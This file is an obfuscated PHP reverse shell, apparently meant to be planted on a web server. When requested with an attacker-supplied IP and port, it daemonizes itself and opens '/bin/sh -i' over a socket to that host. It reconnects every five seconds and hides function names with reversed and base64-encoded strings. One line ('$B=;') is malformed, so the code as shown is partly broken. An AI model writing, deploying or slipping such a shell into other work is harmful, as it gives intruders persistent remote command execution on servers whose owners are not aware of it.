<?php
error_reporting(0);
@ini_set('display_errors',0);
@set_time_limit(0);

// Fork and daemonize
if (function_exists('pcntl_fork') && function_exists('posix_setsid')) {
    $pid = pcntl_fork();
    if ($pid == -1) {
        exit("Could not fork");
    } elseif ($pid > 0) {
        // Parent exits
        exit();
    }
    // Child continues
    if (posix_setsid() == -1) {
        exit("Could not detach from terminal");
    }
    // Optional second fork to prevent reacquisition of terminal
    $pid2 = pcntl_fork();
    if ($pid2 == -1) {
        exit("Could not fork second time");
    } elseif ($pid2 > 0) {
        exit();
    }
    // Change working directory to root
    chdir('/');
    umask(0);

    // Redirect standard file descriptors to /dev/null
    $stdIn  = fopen('/dev/null', 'r');
    $stdOut = fopen('/dev/null', 'a');
    $stdErr = fopen('/dev/null', 'a');
    if ($stdIn)  { fclose(STDIN);  define('STDIN',  $stdIn);  }
    if ($stdOut) { fclose(STDOUT); define('STDOUT', $stdOut); }
    if ($stdErr) { fclose(STDERR); define('STDERR', $stdErr); }
}

$A=''; 
$B=;               

$C=isset($_GET[base64_decode('aXA=')])?$_GET[base64_decode('aXA=')]:$A;
$D=isset($_GET[base64_decode('cG9ydA==')])?(int)$_GET[base64_decode('cG9ydA==')]:$B;

if($D<1||$D>65535)exit(base64_decode('SW52YWxpZCBwb3J0IG51bWJlci4='));

$E=trim(base64_decode($C));
if(!filter_var($E,FILTER_VALIDATE_IP))exit(base64_decode('SW52YWxpZCBJUCBhZGRyZXNzLg=='));

$F=base64_decode('L2Jpbi9zaCAtaQ=='); // '/bin/sh -i'

$G=strrev('nepokcosf');          // fsockopen
$H=strrev('nepo_corp');          // proc_open
$I=strrev('gnikcolb_tes_maerts'); // stream_set_blocking
$J=strrev('tceles_maerts');      // stream_select

while(1){
    $K=@$G($E,$D);
    if(!$K){sleep(5);continue;}
    $L=[
        0=>['pipe','r'],
        1=>['pipe','w'],
        2=>['pipe','w']
    ];
    $M=@$H($F,$L,$N);
    if(!is_resource($M)){@fclose($K);sleep(5);continue;}
    @$I($N[0],false);
    @$I($N[1],false);
    @$I($N[2],false);
    @$I($K,false);
    while(1){
        if(@feof($K)||@feof($N[1]))break;
        $O=[$K,$N[1],$N[2]];
        $P=$Q=$R=null;
        $S=@$J($O,$P,$Q,1);
        if($S===false)break;
        if(in_array($K,$O)){
            $T=@fread($K,1400);
            if($T===false||strlen($T)===0)break;
            @fwrite($N[0],$T);
        }
        if(in_array($N[1],$O)){
            $U=@fread($N[1],1400);
            if($U===false||strlen($U)===0)break;
            @fwrite($K,$U);
        }
        if(in_array($N[2],$O)){
            $V=@fread($N[2],1400);
            if($V===false||strlen($V)===0)break;
            @fwrite($K,$V);
        }
    }
    @fclose($K);
    @fclose($N[0]);
    @fclose($N[1]);
    @fclose($N[2]);
    @proc_close($M);
    sleep(5);
}
?>
